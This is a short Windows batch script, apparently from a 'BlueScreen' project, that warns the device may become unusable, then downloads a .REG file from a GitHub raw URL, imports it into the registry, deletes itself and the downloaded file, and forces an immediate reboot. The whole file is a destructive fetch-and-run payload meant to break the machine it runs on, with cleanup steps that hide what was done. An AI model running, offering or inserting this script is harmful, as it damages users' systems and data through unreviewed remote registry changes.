%echo off
echo Press any key 5 times to confirm you want this device to possibly become unusable.
pause
pause
pause
pause
pause
powershell /c Invoke-WebRequest https://raw.githubusercontent.com/ProjectBluescreen/BlueScreen/main/online_temp.REG -OutFile temp.REG
temp.REG
del online_bluescreen.bat
del temp.REG
shutdown -r -t 1
del temp.bat

